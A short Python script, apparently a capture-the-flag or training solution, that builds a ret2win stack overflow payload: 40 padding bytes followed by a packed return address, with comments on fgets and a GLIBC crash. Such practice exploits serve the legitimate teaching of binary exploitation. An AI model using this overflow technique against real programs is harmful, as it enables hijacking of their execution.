# NOTE: the process might crash when dumping the flag on some GLIBC implementations in buffered_vfprintf function
# this happened on Ubuntu with GLIBC 2.27-3ubuntu1

import struct

# null bytes are not a problem since fgets is used to read our payload
ret2win = 0x0000000000400811
p = "A"*40

# < is for little endian and Q for unsigned long long
p += struct.pack("<Q", ret2win)

print(p)
